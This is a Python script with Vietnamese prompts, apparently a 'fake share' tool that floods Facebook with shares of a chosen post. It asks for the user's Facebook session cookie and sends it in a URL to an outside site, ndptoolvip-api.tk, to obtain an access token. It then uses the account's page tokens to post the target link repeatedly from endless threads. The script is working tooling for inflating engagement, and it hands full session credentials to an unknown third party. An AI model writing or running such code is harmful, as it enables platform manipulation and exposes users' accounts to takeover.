import requests,random,threading,os
os.system('title TOOL SHARE ẢO COOKIE PRO5')
list_token = []
class Secookie:
    def gettoken(self, cookie):
        json_info = requests.get('https://ndptoolvip-api.tk/api/gettokeneaabw.php?cookie='+cookie).json()
        if json_info['status'] == 'success':
            return json_info
        else:
            return False
    def getpage(self, token):
        try:
            json_get = requests.get('https://graph.facebook.com/me/accounts?access_token='+token).json()['data']
            if len(json_get) != 0:
                return json_get
            else: 
                return False
        except:
            return False
    def run_share(self, tokenpage, id_post):
        rq_url = random.choice([requests.get, requests.post])
        sharepost = rq_url(f'https://graph.facebook.com/me/feed?method=POST&link=https://m.facebook.com/{id_post}&published=0&access_token={tokenpage}').json()
        if 'id' in sharepost:
            idshare = sharepost['id']
            print(f'[FRIVE] | [UID SHARE: {idshare}] | TRẠNG THÁI: SUCCESS ')
        else:
            print('[FRIVE] | TRẠNG THÁI: ERROR')
while True:
    cookie = input('VUI LÒNG NHẬP COOKIE FACEBOOK CHỨA PAGE: ')
    dpcute = Secookie()
    checklive = dpcute.gettoken(cookie)
    if checklive != False:
        token = checklive['access_token']
        name  = checklive['name']
        uid   = checklive['id']
        print('─'*50)
        print(f'NAME FB: {name} | UID FB: {uid}')
        print('─'*50)
        break
    else:
        print('Cookie Die Or Out Vui Lòng Nhập Lại!!')
        continue
id_post = input('UID POST: ')
print('─'*50)
luong = int(input('VUI LÒNG NHẬP SỐ LUỒNG SHARE: '))
print('─'*50)
getpage = dpcute.getpage(token)
if getpage != False:
    print(f'Đã Tìm Thấy | {len(getpage)} | Page', end='\r')
    for getdl in getpage:
        tokenpagegett = getdl['access_token']
        list_token.append(tokenpagegett)
else:
    print('Không Tìm Thấy Page Nào!!')
while True:
    for tokenpage in list_token:
        t = threading.Thread(target=dpcute.run_share,args=(tokenpage, id_post))
        t.start()
        while threading.active_count() > luong:
            t.join()
